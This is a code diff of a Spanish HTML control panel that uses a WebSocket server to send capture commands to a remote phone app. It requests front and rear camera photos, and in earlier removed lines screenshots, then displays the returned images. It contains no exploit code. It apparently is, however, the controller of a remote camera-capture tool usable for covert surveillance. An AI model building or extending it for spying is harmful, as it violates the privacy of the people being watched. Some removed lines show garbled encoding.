@@ -3,187 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel de Control Multimedia</title>
+    <title>Panel de Monitoreo Central</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #1a1a1a;
-            color: #ffffff;
+            background-color: #0f0f12;
+            color: #e2e8f0;
             margin: 0;
             padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
+            min-height: 100vh;
         }
-        h1 { color: #9b59b6; margin-bottom: 10px; }
-        .estado-contenedor {
-            margin-bottom: 20px;
+        .panel {
+            background-color: #18181c;
+            border: 1px solid #2d2d34;
+            border-radius: 12px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        h1 {
+            font-size: 1.6em;
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+        .status-box {
             font-size: 1.1em;
-        }
-        .indicador {
             font-weight: bold;
-            padding: 5px 10px;
-            border-radius: 4px;
+            margin-bottom: 25px;
+            padding: 8px;
+            border-radius: 6px;
+            background-color: #222226;
+            display: inline-block;
+            padding: 6px 15px;
         }
-        .desconectado { background-color: #c0392b; color: #fff; }
-        .conectado { background-color: #2ecc71; color: #fff; }
-        
-        .panel-principal {
-            display: flex;
-            gap: 20px;
-            max-width: 1000px;
+        #estado-indicador {
+            color: #e74c3c; /* Rojo por defecto */
+            transition: color 0.3s ease;
+        }
+        .btn {
+            display: block;
             width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
         }
-        .seccion-izquierda {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
+        .btn-frontal {
+            background-color: #3a86ff;
+            color: #ffffff;
         }
-        .visor-imagen {
-            flex: 1.5;
-            background-color: #111;
-            border: 2px dashed #444;
+        .btn-frontal:hover { background-color: #2a75e6; }
+        .btn-trasera {
+            background-color: #8338ec;
+            color: #ffffff;
+        }
+        .btn-trasera:hover { background-color: #7026d3; }
+        .btn:active { transform: scale(0.98); }
+        
+        .viewer-box {
+            margin-top: 25px;
+            border: 2px dashed #3a3a44;
             border-radius: 8px;
+            min-height: 250px;
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-            min-height: 400px;
+            background-color: #111115;
+            overflow: hidden;
         }
-        .visor-imagen img {
+        #pantalla-captura {
             max-width: 100%;
-            max-height: 500px;
-            border-radius: 4px;
+            height: auto;
             display: none;
         }
-        .placeholder-texto {
-            color: #666;
-            font-style: italic;
-        }
-        button {
-            background-color: #8e44ad;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 1em;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.2s;
-            width: 100%;
-        }
-        button:hover { background-color: #9b59b6; }
-        button:active { background-color: #7d3c98; }
-        
-        .consola {
-            background-color: #000;
-            border: 1px solid #333;
-            border-radius: 6px;
-            font-family: 'Courier New', Courier, monospace;
-            padding: 10px;
-            height: 150px;
-            overflow-y: auto;
+        .placeholder-text {
+            color: #64748b;
             font-size: 0.9em;
-            color: #2ecc71;
         }
-        .log-linea { margin: 4px 0; }
     </style>
 </head>
 <body>
 
-    <h1>Panel Web de Control</h1>
-    
-    <div class="estado-contenedor">
-        Estado del Dispositivo: <span id="estado-dispositivo" class="indicador desconectado">DESCONECTADO</span>
-    </div>
-
-    <div class="panel-principal">
-        <div class="seccion-izquierda">
-            <button onclick="enviarOrden('SCREENSHOT')">馃摳 Capturar Pantalla</button>
-            <button onclick="enviarOrden('CAMARA_TRASERA')">馃摲 Disparar C谩mara Trasera</button>
-            <button onclick="enviarOrden('CAMARA_FRONTAL')">馃こ Disparar C谩mara Frontal</button>
-            
-            <h3>Registro de Consola (Logs)</h3>
-            <div id="consola-logs" class="consola">
-                <div class="log-linea">[SISTEMA] Iniciando panel de control web...</div>
-            </div>
+    <div class="panel">
+        <h1>Control de Dispositivo</h1>
+        <div class="status-box">
+            Estado del Móvil: <span id="estado-indicador">DESCONECTADO</span>
         </div>
 
-        <div class="visor-imagen">
-            <span id="txt-placeholder" class="placeholder-texto">Esperando transmisi贸n de imagen...</span>
-            <img id="pantalla-monitor" src="" alt="Transmisi贸n en vivo">
+        <button class="btn btn-frontal" onclick="enviarComando('capturar_foto_frontal')">Capturar Cámara Frontal</button>
+        <button class="btn btn-trasera" onclick="enviarComando('capturar_foto_trasera')">Capturar Cámara Trasera</button>
+
+        <div class="viewer-box">
+            <span id="placeholder" class="placeholder-text">Esperando captura de imagen remota...</span>
+            <img id="pantalla-captura" src="" alt="Captura de dispositivo móvil">
         </div>
     </div>
 
     <script>
-        // Configurar la URL de los WebSockets detectando el protocolo autom谩ticamente (http -> ws o https -> wss)
-        const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-        const wsUrl = protocol + window.location.host;
-        let socket;
+        // Establecer enlace WebSocket directo a la instancia de Render
+        const socket = new WebSocket("wss://servidor-nube.onrender.com");
 
-        function conectarWebSocket() {
-            socket = new WebSocket(wsUrl);
+        socket.onopen = () => {
+            console.log("Conectado al canal del servidor.");
+            // Identificar esta pesta?a del navegador ante el server como la interfaz de control
+            socket.send(JSON.stringify({ tipo: "web" }));
+        };
 
-            socket.onopen = () => {
-                agregarLog("[SISTEMA] Conectado al servidor en la nube. Sincronizando...");
-                // Registrar esta ventana como el Monitor que env铆a las 贸rdenes
-                socket.send(JSON.stringify({ tipo: 'REGISTRO_MONITOR' }));
-            };
+        socket.onmessage = (event) => {
+            try {
+                const datos = JSON.parse(event.data);
 
-            socket.onmessage = (event) => {
-                try {
-                    const datos = JSON.parse(event.data);
-
-                    if (datos.tipo === 'ESTADO') {
-                        actualizarEstatus(datos.estatus);
-                    } 
-                    else if (datos.tipo === 'DISPLAY_IMAGEN') {
-                        const img = document.getElementById('pantalla-monitor');
-                        const placeholder = document.getElementById('txt-placeholder');
-                        
-                        img.src = "data:image/png;base64," + datos.base64;
-                        img.style.display = "block";
-                        placeholder.style.display = "none";
-                        agregarLog("[SISTEMA] Monitor multimedia actualizado.");
-                    } 
-                    else if (datos.tipo === 'CONSOLA') {
-                        agregarLog("> " + datos.msg);
-                    }
-                } catch (e) {
-                    // Ignorar respuestas que no correspondan a la estructura JSON esperada
+                // Monitoreo de estado dinámico de la app de Cordova
+                if (datos.estadoServicio === "CONECTADO") {
+                    const ind = document.getElementById("estado-indicador");
+                    ind.innerText = "CONECTADO";
+                    ind.style.color = "#2ecc71"; // Verde brillante
+                } 
+                
+                if (datos.estadoServicio === "DESCONECTADO") {
+                    const ind = document.getElementById("estado-indicador");
+                    ind.innerText = "DESCONECTADO";
+                    ind.style.color = "#e74c3c"; // Rojo intenso
                 }
-            };
 
-            socket.onclose = () => {
-                actualizarEstatus('DESCONECTADO');
-                agregarLog("[ALERTA] Conexi贸n perdida con la nube. Reconectando en 3s...");
-                setTimeout(conectarWebSocket, 3000);
-            };
-        }
-
-        function enviarOrden(nombreComando) {
-            if (socket && socket.readyState === WebSocket.OPEN) {
-                agregarLog(`[SISTEMA] Solicitando ${nombreComando}...`);
-                socket.send(JSON.stringify({ tipo: 'ACCION', comando: nombreComando }));
-            } else {
-                alert("No hay conexi贸n activa con el servidor.");
+                // Renderizar la foto capturada por Base64 de forma asíncrona
+                if (datos.accion === "mostrar_foto") {
+                    document.getElementById("placeholder").style.display = "none";
+                    const imgTag = document.getElementById("pantalla-captura");
+                    imgTag.src = datos.imagen;
+                    imgTag.style.display = "block";
+                }
+            } catch (err) {
+                console.error("Error interpretando respuesta del websocket:", err);
             }
-        }
+        };
 
-        function actualizarEstatus(estatus) {
-            const indicador = document.getElementById('estado-dispositivo');
-            if (estatus === 'CONECTADO') {
-                indicador.innerText = "CONECTADO";
-                indicador.className = "indicador conectado";
-            } else {
-                indicador.innerText = "DESCONECTADO";
-                indicador.className = "indicador desconectado";
-            }
-        }
+        socket.onclose = () => {
+            const ind = document.getElementById("estado-indicador");
+            ind.innerText = "SERVIDOR CAíDO";
+            ind.style.color = "#e74c3c";
+        };
 
-        function agregarLog(texto) {
-            const consola = document.getElementById('consola-logs');
-            const nuevaLinea = document.createElement('div');
-            nuevaLinea.className = 'log-linea';
-            nuevaLinea.innerText = texto;
+        // Función global para despachar peticiones a la cola del servidor
+        function enviarComando(nombreAccion) {
+            const paqueteComando = {
+                tipo: "comando_accion",
+                accion: nombreAccion
+            };
+            socket.send(JSON.stringify(paqueteComando));
+            console.log("Comando enviado al puente:", nombreAccion);
+        }
+    </script>
+</body>
+</html>
